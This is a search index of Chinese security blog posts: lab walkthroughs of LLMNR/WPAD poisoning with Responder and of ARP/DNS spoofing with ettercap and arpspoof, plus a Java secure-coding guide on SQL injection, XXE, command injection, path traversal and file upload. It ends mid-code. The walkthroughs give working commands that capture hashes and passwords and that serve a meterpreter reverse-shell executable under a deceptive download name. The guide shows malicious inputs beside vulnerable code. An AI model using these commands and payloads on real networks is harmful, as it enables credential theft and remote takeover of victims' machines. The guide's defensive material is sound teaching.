<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[中间人攻击————LLMNR以及Responder]]></title>
    <url>%2F2018%2F03%2F08%2Fspoof-llmnr-wpad%2F</url>
    <content type="text"><![CDATA[概述继续学习一波中间人攻击的LLMNR以及Responder，备忘。 概述Windows系列机子在局域网中查询DNS一般通过如下的几个步骤： 查看本地hosts文件。 1type C:\Windows\system32\drivers\etc\hosts 查询本地DNS缓存。 1ipconfig/displaydns 向dns服务器发送dns请求。 如果本地网络中的dns也解析失败,它就会被交给LLMNR[链路本地多播名称解析]和netbios-ns去处理解析。 LLMNR 以及 NetBIOS——NS从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。 LLMNR为使用IPv4、IPv6或者同时使用这两种地址的设备提供了点对点名称解析服务，LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。 LLMNR通过在DNS名称解析服务不可用时提供解析服务，弥补了DNS的不足。 LLMNR 和DNS一样，LLMNR 名称解析过程所使用的传输协议为 UDP 协议。其IPv4 的广播地址为 - 224.0.0.252, IPv6 的广播地址为 - FF02:0:0:0:0:0:1:3 或 FF02::1:3。在主机中所监听的端口为 UDP/5355。 使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示： 从上图可以看到，主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和 IPv6 的广播地址进行了广播。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或 AAAA 进行区别。一个 A 表示请求的地址类型为 IPv4 地址，四个A（AAAA）表示请求的地址类型为 IPv6 地址。 NetbiosNetbios 即名称服务,专门用于同一内网下windows机器之间通过机器名相互访问,工作在会话层。NetBIOS是本地网络的系统API，它有三种NetBIOS服务： 域名服务，使用137端口用于域名注册和域名解析 数据分发服务，使用138端口连接通信 会话服务，使用139端口面向连接通信 在dns查询失败后，LLMNR会调用NetBIOS，生成一个NetBIOS-NS数据包然后使用广播的方式发送出去。 这个看似没什么坏处的协议，我们可以利用其进行中间人攻击从而获取敏感数据，如用户名，hash等。 劫持会话获取 HASH 劫持 SMB 会话获取 HASH 利用 LLMNR Poison 攻击劫持 SMB 会话与 SMBRelay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是 SMBRelay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用 LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMBRelay 攻击结合起来，提升攻击力。 使用 HTTP 401 认证获取 HASH 使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH。 攻击原理假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.1 当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码。 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 此时,我们再利用responder 来获取目标的smb hash,虽然不是明文,但我们可以配合类似hashcat的hash破解工具尝试破解该hash,当然,如果你有自己的GPU矩阵就再好不过了,或许很快就可以拿到对应的明文 1root@kali:~# responder -I eth0 然后再回到A上通过smb进行访问： Kali 攻击机上可以看到如下hash值 WPADWPAD（web代理自动发现协议-Web Proxy Auto-Discovery Protocol），是客户端通过DHCP或DNS协议探测代理服务器配置脚本url的一种方式。当IE定位脚本并将脚本下载到本地之后，就可以通过该脚本来为不同的url选择相应的代理服务器。目前主流浏览器一般都支持WPAD。 只要应用于如下场景，公司内网为了安全，不允许员工直接访问外网的服务，但是允许公司员工通过web代理访问外网资源，但是对于员工来说设置代理又是个麻烦事，所以通常公司主要使用用WPAD来查找网络中的wpad.dat文件的,有了该文件以后,客户端以后就会根据文件中的内容自动配置代理。 查询wpad.dat文件主要通过如下几个方式： 通过dns查询。 通过dhcp服务进行检索。 利用LLMNR查询。 攻击原理可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为自动检测代理设置的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器。 假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.156（desktop-9hmbf0） 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 1root@kali:~# responder -I eth0 -wFb 在被欺骗主机上开启自动检测脚本 被欺骗者访问主机目标服务器，并登陆 Kali 攻击机上可以看到如下明文密码 其他Responder 结合钓鱼页面/跨站进行伪造钓鱼页面或者借助跨站插入如下相关请求： 12&lt;img/src=\\orleven\1.jpg width=0 height=0&gt; &lt;img/src=http:\\orleven\1.jpg width=0 height=0&gt; responder 钓鱼木马 首先,准备好自己的马,这里我就暂时直接用msf来生成了，现实中免杀是必须的,生成好以后把它放到我们的responder的files目录中， 12root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.183 LPORT=1234 -f exe -o /root/Desktop/shell.exeroot@kali:~# mv /root/Desktop/shell.exe /usr/share/responder/files/ msf监听端口 12345use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.111.183 set LPORT 1234exploit -j 编辑responder.conf 1root@kali:~# vi /etc/responder/Responder.conf 12345Serve-Always = OnServe-Exe = On HtmlFilename = files/AccessDenied.htmlExeFilename = files/shell.exe 指定我们刚刚生成的shell名称ExeDownloadName = ProxyClient.exe 提示下载时所显示的名称,最好弄个成功率比较高的有诱惑性的名字 启动responder： 1root@kali:~# responder -I eth0 -wrf 等待被欺骗机访问任意域名，下载运行程序 kali成功控制。 参考文章利用LLMNR协议进行常规win内网渗透的理解与实践利用 LLMNR 名称解析缺陷劫持内网指定主机会话]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>arpspoof</tag>
        <tag>dnsspoof</tag>
        <tag>responder</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击————ARP毒化与DNS毒化]]></title>
    <url>%2F2018%2F02%2F28%2Farpspoof-dnsspoof%2F</url>
    <content type="text"><![CDATA[概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。 准备测试机子如下 ： 攻击者：192.168.111.183被欺骗主机：192.168.111.173默认网关（_gateway）：192.168.111.2 ARP毒化查看arp表 1234root@kali:~# arpAddress HWtype HWaddress Flags Mask Iface192.168.111.254 ether 00:50:56:fe:53:af C eth0_gateway ether 00:50:56:e6:26:42 C eth0 开启转发 12345root@kali:~# cat /proc/sys/net/ipv4/ip_forward0root@kali:~# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardroot@kali:~# cat /proc/sys/net/ipv4/ip_forward1 EttercapEttercap是一个多用途的开源工具，可以用来执行嗅探、密码抓取、主机分析等，并且还可以图形化启动。 另外ettercap有些不错的插件，可以增强中间人攻击。 12345dns_spoof (执行DNS欺骗攻击)Dos_attack(对受害主机进行拒绝服务攻击)Chk_poison(检测是否成功进行了攻击)Repoison_arp(顾名思义，修复ARP)...... 具体操作如下： 123root@kali:~# ettercap -G // 图形化启动ettercaproot@kali:~# ettercap -T -q -M ARP // 对所有主机进行ARP欺骗root@kali:~# ettercap -T -q -M ARP -A 192.168.111.173 // 对192.168.111.173进行欺骗 查看受害者主机的arp表会发现，网关的mac地址被替换成了攻击机的mac地址。 DsniffDsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如： 12345MsgsnarfUrlsnarfMailsnarfFilesnarfdnsspoof arpspoof重定向受害者的流量传送给攻击者。1234root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.2root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.20:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9...... arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）1234root@kali:~# arpspoof -i eth0 -t 192.168.111.2 192.168.111.1830:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9...... 截获敏感信息12root@kali:~# driftnet -i eth0 // 截获图片root@kali:~# dsniff -i eth0 // 截获密码 DNS毒化DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问baidu.com，并且谷歌的IP地址为220.181.57.216，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 Ettercapettercap包含一个DNS插件，可以进行DNS欺骗攻击。 在服务器上开启web服务。 查找编辑etter.dns文件，并在里面添加需要进行欺骗网站域名： 123root@kali:~# find / -name etter.dns/etc/ettercap/etter.dnsroot@kali:~# vim /etc/ettercap/etter.dns 比如将google.com的ip导向118.24.150.108 123google.com A 118.24.150.108 *.google.com A 118.24.150.108 www.google.com PTR 118.24.150.108 然后启动 1root@kali:~# ettercap -G 点击上方菜单的Sniff，选择Unified sniffing，并选择网卡。 点击上方菜单的Hosts，选择Scan for hosts，进行主机扫描。 点击上方菜单的Hosts，选择Hosts list，进行选择目标主机为target1，选择网关为target2。 点击上方菜单的Mitm，选择ARP Poisoning，然后勾选Sniff remote connections。 点击上方菜单的Plugins，选择Manage the plugins，然后勾选dns_spoof以及remote browser,当然还有其他插件，根据需求选择。 目标主机访问此域名google。 参考资料中间人攻击-ARP毒化中间人攻击-DNS毒化]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>arpspoof</tag>
        <tag>dnsspoof</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口渗透总结]]></title>
    <url>%2F2018%2F02%2F08%2Fport-pentest%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 ]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>docker</tag>
        <tag>information gathering</tag>
        <tag>java unserialize</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>mysql</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
        <tag>webshpere</tag>
        <tag>port</tag>
        <tag>intranet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计总结]]></title>
    <url>%2F2018%2F01%2F13%2Fcode-audit-summary%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 ]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>java</tag>
        <tag>php</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计(Java)]]></title>
    <url>%2F2017%2F12%2F31%2Fcode-audit-java%2F</url>
    <content type="text"><![CDATA[概述由于工作需要，开始接触代码审计的相关工作。因为之前对这方面并没有很清晰的概念，所以特地学习下 Web应用安全的核心问题用户提交的数据不可信是Web应用程序核心安全问题。 SQL注入原理合法输入12id=1SELECT * FROM users WHRER id=&apos;1&apos;; 恶意输入12id=1&apos; or &apos;1&apos;=&apos;1SELECT * FROM users WHRER id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;; Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class SQLInject &#123; public static void main(String[] args)throws Exception&#123; //正常输入 select(&quot;1&quot;); // 恶意输入 select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //2.创建statement类对象，用来执行SQL语句！！ Statement statement = con.createStatement(); //要执行的SQL语句 String sql = &quot;select * from users where id=&apos;&quot; + id + &quot;&apos;&quot;; //3.ResultSet类，用来存放获取的结果集！！ ResultSet rs = statement.executeQuery(sql); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+sql); System.out.println(&quot;执行结果如下所示:&quot;); String name, uname; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); res.add(new String[]&#123;&quot;id: &quot;+rs.getString(&quot;id&quot;) + &quot;,uname:&quot;+rs.getString(&quot;uname&quot;) + &quot;,passwd:&quot;+rs.getString(&quot;passwd&quot;) + &quot;,name:&quot;+rs.getString(&quot;name&quot;)&#125; ); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 123456SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice----------------- 12345678SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句:select * from users where id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;执行结果如下所示:test Aliceadmin Orlevenuser Bob----------------- 合规代码（参数化查询）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SQLFormat &#123; public static void main(String[] args)throws Exception&#123; select(&quot;1&quot;); select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //要执行的SQL语句 String sql = &quot;select * from users where id=?&quot;; //创建statement类对象，ResultSet类，用来存放获取的结果集！！ PreparedStatement stmt = con.prepareStatement(sql); stmt.setString(1, id); ResultSet rs = stmt.executeQuery(); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+stmt.toString()); System.out.println(&quot;执行结果如下所示:&quot;); String uname,name; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 12345SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice 至于为什么还有1个查询结果，那就是Mysql的字符特性的问题了，这里不作多的解释。12345SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句: select * from users where id=&apos;1\&apos; or \&apos;a\&apos;=\&apos;a&apos;执行结果如下所示:test Alice 防范建议 采用参数查询即预编译方式（首选） 字符串过滤 XXE原理合法输入123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;uname&gt;test&lt;/uname&gt; &lt;passwd&gt;e10adc3949ba59abbe56e057f20f883e&lt;/passwd&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;/user&gt;&lt;/users&gt; 1&#123;&quot;id&quot;:&quot;1&quot;,&quot;uname&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;name&quot;:&quot;Alice&quot;&#125; 恶意输入1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://localhost/text.txt&quot; &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;%26xxe;&lt;/methodname&gt;&lt;/methodcall&gt; 本地80端口WEB服务器收到如下请求： 12345127.0.0.1 - - [08/Jan/2018:17:03:27 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot; Java代码分析不合规代码1234567891011121314151617181920212223242526272829public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 报错如下：1org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 50; 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。 防范建议 使用开发语言提供的禁用外部实体的方法（首选） 过滤用户提交的XML数据，关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 命令注入原理合法输入128.8.8.8ping -n/-c 1 8.8.8.8 恶意输入128.8.8.8 &amp; whoamiping -n/-c 1 8.8.8.8 &amp; whoami Java代码分析不合规代码123456789101112131415161718192021222324252627282930313233343536373839public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecInject(data); &#125; public String ExecInject(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecFormat(data); &#125; public String ExecFormat(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; // 严格校验参数 if (!Pattern.matches(&quot;[A-Za-z@.]+&quot;, command))&#123; ; result.put(&quot;message&quot;, &quot;Error!&quot;); return DataUtil.toJson(result); &#125; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 防范建议 白名单 严格权限限制等等 严格校验参数 任意文件下载/目录遍历原理在JAVA web程序的下载文件相关的代码中，若不对HTTP请求中的待下载文件名进行检查，则有可能产生任意文件下载漏洞。目录遍历与任意文件下载的原理相似，这里就简单列个文件下载好了 合法输入12path=users.docsconfig/users.docs 恶意输入12path=../../../../Windows/System32/drivers/etc/HOSTSconfig/../../../../Windows/System32/drivers/etc/HOSTS Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243public class FileTestController &#123; public void FileFileDownVul(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; path = &quot;config/&quot;+path; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class FileTestController &#123; public void FileFileDownFormat(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; try &#123; if (!Pattern.matches(&quot;^([a-z0-9]&#123;32&#125;)$&quot;, path))&#123; ; return ; &#125; path = &quot;config/&quot;+path+&quot;.docx&quot;; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 防范建议 严格的权限限制。 控制路径后缀，对文件名进行检查等。 采用getCanonicalPath、getAbsolutePath等方法。 任意文件上传原理当攻击者利用恶意文件上传漏洞时，通常会向服务器上传jsp木马并访问，可以直接控制服务器。 合法输入1234567891011-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;test.txt-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plaintest-----------------------------11922861918696-- 恶意输入12345678910111213-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;../test.jsp-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plain...webshell....-----------------------------11922861918696-- Java代码分析不合规代码123456789101112131415161718192021222324252627public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = request.getParameter(&quot;name&quot;); if (!file.isEmpty()) &#123; try &#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; else &#123; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = DataUtil.getTimeStamp()+&quot;.jpg&quot;; if (!file.isEmpty()) &#123; try &#123; // 判断大小等等,只要做好配置，并不需要检查文件头。 if(file.getSize()&lt;1024*1024*10)&#123; byte[] bytes = file.getBytes(); 